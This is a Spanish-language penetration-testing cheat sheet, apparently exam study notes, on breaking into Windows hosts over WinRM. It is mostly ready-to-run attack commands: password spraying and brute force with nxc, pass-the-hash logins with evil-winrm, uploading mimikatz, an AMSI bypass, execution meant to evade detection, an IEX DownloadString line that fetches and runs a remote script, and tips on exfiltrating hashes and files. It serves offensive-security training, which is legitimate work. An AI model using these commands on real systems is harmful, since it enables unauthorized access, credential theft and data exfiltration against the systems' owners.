# WinRM (5985 / 5986)

Tags: #WinRM #Windows #DC #EvilWinRM #RemoteManagement #LateralMovement

## OBJETIVO

- Validar si un usuario tiene acceso WinRM
- Conectarse remotamente con credenciales o hash
- Ejecutar comandos y scripts PowerShell en el host remoto
- Transferir archivos hacia y desde el host
- Obtener shell interactiva para post-explotación

## TIPS

1. **WinRM no es acceso de admin → el usuario debe estar en el grupo 'Remote Management Users' o ser admin**
2. **Si nxc dice [Pwn3d!] en WinRM → evil-winrm funciona directamente**
3. **Pass-the-Hash funciona con evil-winrm → si tienes hash NT no necesitas crackear**
4. **5985 → HTTP (más común) | 5986 → HTTPS/SSL → requiere parámetro -S**
5. **evil-winrm da la shell más cómoda del examen → úsala sobre psexec cuando puedas**

## 1. VALIDACIÓN DE ACCESO (ANTES DE CONECTAR)

```bash
❯ nxc winrm <IP> -u 'user' -p 'pass'
# Requiere creds válidas → valida si el usuario tiene acceso WinRM
# [+] → creds válidas pero sin acceso WinRM
# [Pwn3d!] → acceso WinRM confirmado → evil-winrm funciona

❯ nxc winrm <IP> -u 'user' -H 'NThash'
# Requiere hash NT → valida acceso por Pass-the-Hash
# [Pwn3d!] → puedes conectarte sin crackear la contraseña

❯ nxc winrm <IP> -u users.txt -p 'Password123'
# Password spraying → probar una contraseña contra múltiples usuarios
# Cuidado con lockout policy

❯ nxc winrm <IP> -u users.txt -p passwords.txt --continue-on-success
# Fuerza bruta → continúa aunque encuentre credenciales válidas
# Cuidado con lockout policy
```

### Insight

- Validar con nxc ANTES de conectar → confirma que no perderás tiempo
- [Pwn3d!] en WinRM pero no en SMB → el usuario es solo Remote Management User, no admin local

## 2. CONEXIÓN BÁSICA

```bash
❯ evil-winrm -i <IP> -u 'user' -p 'passwd'
# Requiere creds válidas + grupo Remote Management Users o admin
# Abre shell interactiva PowerShell en el host remoto
# Puerto por defecto: 5985 (HTTP)

❯ evil-winrm -i <IP> -u 'Administrator' -H 'NThash'
# Requiere hash NT → Pass-the-Hash directo
# No necesitas la contraseña en claro

❯ evil-winrm -i <IP> -u 'user' -p 'passwd' -P 5986
# Puerto personalizado → útil si WinRM corre en puerto no estándar
```

---

## 3. CONEXIÓN SSL (PUERTO 5986)

```bash
❯ evil-winrm -i <IP> -u 'Administrator' -p 'passwd' -S
# Requiere creds válidas → conexión por HTTPS/SSL (puerto 5986)
# -S → fuerza SSL, sin este parámetro usa 5985 aunque el puerto sea 5986

❯ evil-winrm -i <IP> -c <Certificado.pem> -k <PrivateKey.pem> -S
# Requiere certificado y clave privada → autenticación por certificado
# Útil cuando el servidor requiere autenticación mutua TLS
```

### Insight

- Si 5985 falla pero 5986 está abierto → agregar -S
- Certificados de cliente → revisar shares SMB, pueden estar almacenados ahí

## 4. TRANSFERENCIA DE ARCHIVOS

```bash
# Dentro de la shell evil-winrm:

❯ upload /ruta/local/archivo.exe C:\Windows\Temp\archivo.exe
# No requiere parámetros extra → sube archivo al host remoto
# Útil para subir herramientas de post-explotación (winPEAS, mimikatz, etc.)

❯ download C:\ruta\remota\archivo.txt /ruta/local/archivo.txt
# Descarga archivo del host remoto a tu máquina
# Útil para exfiltrar archivos, hashes, configs
```

### Insight

- Directorio recomendado para subir: `C:\Windows\Temp\` o `C:\ProgramData\`
- Siempre limpia los archivos subidos después de usarlos

## 5. EJECUCIÓN DE COMANDOS Y SCRIPTS

```bash
# Dentro de la shell evil-winrm:

❯ menu
# Muestra todos los comandos y funciones disponibles en evil-winrm

❯ Invoke-Binary /ruta/local/binario.exe
# Ejecuta un binario directamente desde tu máquina sin subirlo al disco
# Útil para evadir detección

❯ Bypass-4MSI
# Intenta bypass de AMSI (Antimalware Scan Interface)
# Ejecutar antes de cargar scripts que puedan ser detectados

❯ IEX(New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')
# Ejecutar script PowerShell desde tu servidor HTTP en memoria
# No toca el disco → más sigiloso
```

```bash
# Desde fuera → ejecución remota sin shell interactiva

❯ nxc winrm <IP> -u 'user' -p 'pass' -x 'whoami'
# Requiere acceso WinRM → ejecuta comando y devuelve output
# Útil para comandos puntuales sin abrir shell completa

❯ nxc winrm <IP> -u 'user' -p 'pass' -x 'ipconfig'
# Ver configuración de red del host remoto

❯ nxc winrm <IP> -u 'user' -p 'pass' -x 'type C:\Users\Administrator\Desktop\root.txt'
# Leer archivos directamente
```

## 6. CARGA DE SCRIPTS POWERSHELL

```bash
# Dentro de la shell evil-winrm:

❯ evil-winrm -i <IP> -u 'user' -p 'passwd' -s /ruta/scripts/
# Carga un directorio de scripts PS1 al iniciar la sesión
# Los scripts quedan disponibles para importar directamente

# Una vez dentro con -s configurado:
❯ PowerView.ps1          # Importar PowerView para enum AD
❯ Get-NetUser            # Usar funciones de PowerView directamente
```

```bash
❯ evil-winrm -i <IP> -u 'user' -p 'passwd' -e /ruta/ejecutables/
# Carga un directorio de ejecutables para usar con Invoke-Binary
```

### Insight

- `-s` para scripts PS1 → PowerView, PowerUp, etc.
- `-e` para ejecutables → winPEAS, SharpHound, mimikatz, etc.
- Combinar `-s` y `-e` → todo disponible desde el inicio de sesión

## CONDICIONES CLAVE

- Usuario en Remote Management Users o admin → acceso WinRM
- [Pwn3d!] en nxc → evil-winrm funciona
- Hash NT disponible → Pass-the-Hash sin necesitar contraseña
- Puerto 5986 → agregar -S obligatoriamente
- Certificado disponible → autenticación TLS con -c y -k

## ONE-LINERS MENTALES

- Tengo creds → validar con nxc winrm antes de conectar
- [Pwn3d!] → evil-winrm -i IP -u user -p pass
- Tengo hash → evil-winrm -i IP -u user -H hash
- Dentro → upload winPEAS → ejecutar → buscar PrivEsc
- Script PS1 → evil-winrm con -s para tenerlo disponible al entrar
